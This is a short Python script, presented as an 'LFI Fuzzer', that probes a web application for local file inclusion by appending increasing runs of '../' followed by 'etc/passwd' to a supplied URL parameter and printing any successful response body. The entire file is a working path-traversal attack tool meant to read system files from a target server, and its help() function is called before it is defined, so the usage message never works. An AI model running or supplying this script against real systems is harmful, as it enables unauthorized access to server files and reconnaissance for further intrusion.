import requests
import time
import sys

try:
    url = str(sys.argv[1])
except:
    help()
try:
    LoopCount = int(sys.argv[2])
except:
    help()
try:
    latency = int(sys.argv[3])
except:
    help()

TestText = "/etc/passwd"
PlusText = "../"

for i in range(LoopCount):
    if (i == 0):
        url2 = url + PlusText * i + TestText
    else:
        TestText = "etc/passwd"
        url2 = url + PlusText * i + TestText
    r = requests.get(url2)
    if (r.status_code == 200):
        print (f"Status code: {r.status_code}\t{url2}")
        print (f"Response: \n{r.text}")
    else:
        print (f"Status code: {r.status_code}\t{url2}")
    
    time.sleep(latency)


def help():
    print ("LFI Fuzzer\n")
    print ("Use example: python3 lfifuzzer.py [url] [loop count] [latency in second]")
    print ("\nUse example: python3 lfifuzzer.py http://example.com/?page= 50 1")